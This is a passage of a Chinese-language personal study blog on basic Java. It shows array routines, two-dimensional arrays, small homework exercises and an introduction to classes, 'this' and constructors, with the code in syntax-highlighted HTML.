 &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    bubblesort(arr);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="数组逆序"><a href="#数组逆序" class="headerlink" title="数组逆序"></a>数组逆序</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[left];</span><br><span class="line">        arr[left] = arr[right];</span><br><span class="line">        arr[right] = tmp;</span><br><span class="line">        left++;</span><br><span class="line">        right--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">    reverse(arr);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="数组比较"><a href="#数组比较" class="headerlink" title="数组比较"></a>数组比较</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="type">int</span>[] arr2 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">fla</span> <span class="operator">=</span> Arrays.equals(arr, arr2);</span><br><span class="line">    System.out.println(fla);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="批量初始化"><a href="#批量初始化" class="headerlink" title="批量初始化"></a>批量初始化</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br><span class="line">    Arrays.fill(arr, <span class="number">2</span>, <span class="number">5</span>, -<span class="number">1</span>);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;s</span><br></pre></td></tr></table></figure><h1 id="二维数组"><a href="#二维数组" class="headerlink" title="二维数组"></a>二维数组</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main3</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//不规则数组,没指定列arr[0]是null</span></span><br><span class="line">    <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][];</span><br><span class="line">    arr[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line">    arr[<span class="number">1</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>];</span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">0</span>]));</span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">1</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//打印</span></span><br><span class="line">    <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">            System.out.print(arr[i][j] + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span>[] arr1: arr) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> x : arr1) &#123;</span><br><span class="line">            System.out.print(x + <span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println();</span><br><span class="line">    System.out.println(Arrays.toString(arr));<span class="comment">//地址</span></span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">0</span>]));<span class="comment">//一维数组</span></span><br><span class="line">    System.out.println(Arrays.toString(arr[<span class="number">1</span>]));<span class="comment">//地址</span></span><br><span class="line">    System.out.println(Arrays.deepToString(arr));<span class="comment">//[[0, 0, 0], [0, 0, 0]]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[][] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>][<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>[][] arr2 = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span>[][] arr3 = &#123;&#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>&#125;,&#123;<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>&#125;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="作业"><a href="#作业" class="headerlink" title="作业"></a>作业</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组中是否存在三个连续的奇数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">func5</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">if</span> (count ==<span class="number">3</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>&#125;;</span><br><span class="line">    System.out.println(func5(arr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//多数元素leecode169</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    Arrays.sort(arr);</span><br><span class="line">    <span class="keyword">return</span> arr[arr.length/<span class="number">2</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//投票法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">majorityElement2</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> arr[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] == ret) &#123;</span><br><span class="line">            count++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            ret = arr[i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    System.out.println(majorityElement2(arr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一个数组，进有一个元素出现一次，其它都出现俩次</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        ret = ret ^ arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    System.out.println(func4(arr));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] funca(<span class="type">int</span>[] arr, <span class="type">int</span> target) &#123;</span><br><span class="line">    <span class="type">int</span>[] ret = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; arr.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (arr[i] + arr[j] == target) &#123;</span><br><span class="line">                ret[<span class="number">0</span>] = i;</span><br><span class="line">                ret[<span class="number">1</span>] = j;</span><br><span class="line">                <span class="keyword">return</span> ret;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//奇数位于偶数之前</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> arr.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[left] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">            left++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right &amp;&amp; arr[right] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> arr[left];</span><br><span class="line">        arr[left] = arr[right];</span><br><span class="line">        arr[right] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main5</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] arr = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    func(arr);</span><br><span class="line">    System.out.println(Arrays.toString(arr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">transform1</span><span class="params">(<span class="type">int</span>[] a)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">        a[i] = a[i] * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span>[] transform(<span class="type">int</span>[] a) &#123;</span><br><span class="line">    <span class="type">int</span>[] tmpArr = <span class="keyword">new</span> <span class="title class_">int</span>[a.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; a.length; i++) &#123;</span><br><span class="line">        tmpArr[i] = a[i] * <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tmpArr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main4</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>&#125;;</span><br><span class="line">    <span class="type">int</span>[] ret = transform(a);<span class="comment">//a不变</span></span><br><span class="line">    System.out.println(Arrays.toString(ret));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="comment">//行为（方法）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;吃饭&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//类名 大驼峰</span></span><br><span class="line"><span class="comment">//方法名 小驼峰</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WashJi</span> &#123;</span><br><span class="line">    <span class="comment">//属性[字段]---》成员属性</span></span><br><span class="line">    <span class="keyword">public</span> String brand;    <span class="comment">//品牌</span></span><br><span class="line">    <span class="keyword">public</span> String type;     <span class="comment">//型号</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> weight;   <span class="comment">//重量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> length;   <span class="comment">//长度</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> width;   <span class="comment">//宽</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> height;   <span class="comment">//高</span></span><br><span class="line">    <span class="keyword">public</span> String color;   <span class="comment">//颜色</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//行为[方法]----》成员方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">WashJi</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;洗衣功能&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dryClothes</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;脱水功能&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTime</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;定时功能&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String color;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">barks</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;汪汪叫~~~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">wag</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name + <span class="string">&quot;摇尾巴&quot;</span>  );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">func</span><span class="params">(String ret)</span> &#123;</span><br><span class="line">        System.out.println(ret);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//实例化一个对象</span></span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog.name = <span class="string">&quot;ctl&quot;</span>;</span><br><span class="line">        dog.barks();</span><br><span class="line">        dog.name=<span class="string">&quot;ctl1&quot;</span>;</span><br><span class="line">        dog.wag();</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        dog2.name = <span class="string">&quot;ximu&quot;</span>;</span><br><span class="line">        dog2.wag();</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="string">&quot;ctl1&quot;</span>;</span><br><span class="line">        <span class="comment">//通过一个类可以实例化无数对象</span></span><br><span class="line">        dog.func(ret);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        person.eat();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><ul><li>this的类型：对应类类型引用，即哪个对象调用就是哪个对象的引用类型</li><li>this只能在成员方法中使用</li><li>在成员方法中，this只能引用当前对象，不能再引用其它对象</li><li>this是成员方法第一个隐藏的参数，编译器会自动传递，在成员方法执行时，编译器会负责将调用成员方法对象的引用传递给该成员方法，this来接收</li></ul> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> year;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> month;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> day;</span><br><span class="line">    <span class="comment">//this.day = 1会报错</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getData</span><span class="params">(<span class="type">int</span> year, <span class="type">int</span> month, <span class="type">int</span> day)</span> &#123;</span><br><span class="line">        year = year;</span><br><span class="line">        month = month;</span><br><span class="line">        day = day;</span><br><span class="line">    &#125;<span class="comment">//这里局部变量会被回收，局部变量优先，这里只是自己给自己赋值了</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getData1</span><span class="params">(<span class="type">int</span> year, <span class="type">int</span> month, <span class="type">int</span> day)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.year = year;</span><br><span class="line">        <span class="built_in">this</span>.month = month;</span><br><span class="line">        <span class="built_in">this</span>.day = day;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printData</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(year + <span class="string">&quot;/ &quot;</span> + month + <span class="string">&quot;/ &quot;</span> + day);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">printData1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.year + <span class="string">&quot;/ &quot;</span> + <span class="built_in">this</span>.month + <span class="string">&quot;/ &quot;</span> + <span class="built_in">this</span>.day);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line"></span><br><span class="line">        c1.getData(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>); <span class="comment">// 0/0/0</span></span><br><span class="line">        c2.getData1(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);<span class="comment">// 1 / 1/ 1</span></span><br><span class="line">        c3.getData1(<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        c1.printData1();</span><br><span class="line">        c2.printData1();</span><br><span class="line">        c3.printData1();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main1</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">cal</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">cal</span>();</span><br><span class="line">        <span class="comment">//c1.getData(1,1,10);</span></span><br><span class="line">        <span class="comment">//c1.getData1(2023,6,6);</span></span><br><span class="line">        <span class="comment">/*c1.month=2;</span></span><br><span class="line"><span class="comment">        c1.year=1;</span></span><br><span class="line"><span class="comment">        c1.day=3;*/</span></span><br><span class="line">        c1.printData();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="作业-1"><a href="#作业-1" class="headerlink" title="作业"></a>作业</h3> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInof</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My name is &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myName();</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();</span><br><span class="line">        stu.setInof(<span class="string">&quot;yxz&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        stu.myName();</span><br><span class="line">        stu.myInfo();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h2> <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stu</span> &#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;yxz&quot;</span>;<span class="comment">//就地初始化，但只适合默认的一些量</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setInof</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;My name is &quot;</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stu</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//要写在第一条</span></span><br><span class="line">        <span class="built_in">this</span>(<span class="string">&quot;yxz&quot;</span>, <span class="number">12</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;不带参数的构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stu</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;<span class="comment">//构造方法可以重载1.方法名相同，2.参数列表不同3.返回值不一定相同</span></span><br><span class="line">        <span class="comment">//this();//不能循环调用</span></span><br><span class="line">        System.out.println(<span class="string">&quot;带俩个参数的构造犯法&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">myInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myName();</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main2</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>();<span class="comment">//实例化时一定会调用构造方法，若没有提供，编译器会提供一个</span></span><br><span class="line">        <span class="type">Stu</span> <span class="variable">stu2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stu</span>(<span class="string">&quot;yxz&quot;</span>, <span class="number">12</span>);<span class="comment">//构造方法调用完成后，对象才实际上产生</span></span><br><span class="line">        <span class="comment">//stu.setInof(&quot;yxz&quot;, 12);//引用类型默认值是null</span></span><br><span class="line"><span class="comment">/*        